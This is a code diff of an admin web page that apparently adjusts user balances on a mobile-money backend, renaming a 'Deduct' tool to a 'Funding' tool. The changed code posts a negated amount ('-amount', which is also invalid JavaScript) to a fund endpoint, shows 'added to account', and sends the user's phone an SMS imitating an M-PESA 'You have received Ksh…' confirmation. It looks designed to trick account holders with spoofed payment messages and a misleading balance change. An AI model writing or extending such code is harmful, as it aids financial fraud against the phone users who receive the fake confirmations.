@@ -6,7 +6,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin - Deduct Tool</title>
+    <title>Admin - Funding Tool</title>
     <style>
         body { 
             font-family: sans-serif; 
@@ -89,13 +89,13 @@
 <body>
 
 <div class="fund-box">
-    <h2 style="color: #ff5252; margin-top: 0;">Deduct Account</h2>
-    <p style="margin-bottom: 20px; color: #ccc;">Enter details to deduct balance</p>
+    <h2 style="color: #4CAF50; margin-top: 0;">Fund Account</h2>
+    <p style="margin-bottom: 20px; color: #ccc;">Enter details to add balance</p>
     
     <input type="text" id="phone" placeholder="User Phone Number">
     <input type="number" id="amount" placeholder="Amount (e.g. 5000)">
     
-    <button onclick="submitFunds()">Deduct Funds</button>
+    <button onclick="submitFunds()">Add Funds Now</button>
     
     <p id="status"></p>
 </div>
@@ -119,10 +119,10 @@
         status.innerText = "Processing...";
 
         try {
-            const response = await fetch('https://funds-mauve.vercel.app/api/deduct', {
+            const response = await fetch('https://funds-mauve.vercel.app/api/fund', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone, amount })
+                body: JSON.stringify({ phone, -amount })
             });
             const result = await response.json();
             
@@ -133,7 +133,7 @@
                 const timeStr = formatTime12Hour();
                 const newBalance = result.newBalance || 0;
                 
-                const confirmationMsg = `${token} Confirmed. Ksh${parseFloat(amount).toFixed(2)} paid to Mledger intasend Solutions Limited 313031 on ${dateStr} at ${timeStr}. New M-PESA balance is Ksh${newBalance.toFixed(2)}. Separate personal and business funds through pochi la Biashara on *334#`;
+                const confirmationMsg = `${token} Confirmed.You have received Ksh${parseFloat(amount).toFixed(2)} from Mledger intasend Solutions Limited 313031 on ${dateStr} at ${timeStr}. New M-PESA balance is Ksh${newBalance.toFixed(2)}. Separate personal and business funds through pochi la Biashara on *334#`;
 
                 // Send confirmation message to message API
                 fetch('https://message-server-five.vercel.app/api/messages', {
@@ -142,14 +142,14 @@
                     body: JSON.stringify({
                         phone: phone,
                         message: confirmationMsg,
-                        type: 'deducted'
+                        type: 'received'
                     })
                 }).catch(err => {
                     console.warn("Confirmation message failed to send:", err);
                 });
 
                 status.style.color = "#4CAF50";
-                status.innerHTML = `<strong>✅ Success!</strong><br>Ksh ${amount} deducted from account.<br><span style="font-size:0.75rem;color:#aaa">Token: ${token}</span>`;
+                status.innerHTML = `<strong>✅ Success!</strong><br>Ksh ${amount} added to account.<br><span style="font-size:0.75rem;color:#aaa">Token: ${token}</span>`;
                 setTimeout(() => resetUI(), 3000);
             } else {
                 status.style.color = "#ff5252";
@@ -166,7 +166,7 @@
     function resetUI() {
         const payBtn = document.querySelector('button');
         payBtn.disabled = false;
-        payBtn.innerText = "Deduct Funds";
+        payBtn.innerText = "Add Funds Now";
     }
 
     // ─── Token format helpers ──────────────────────────────────────
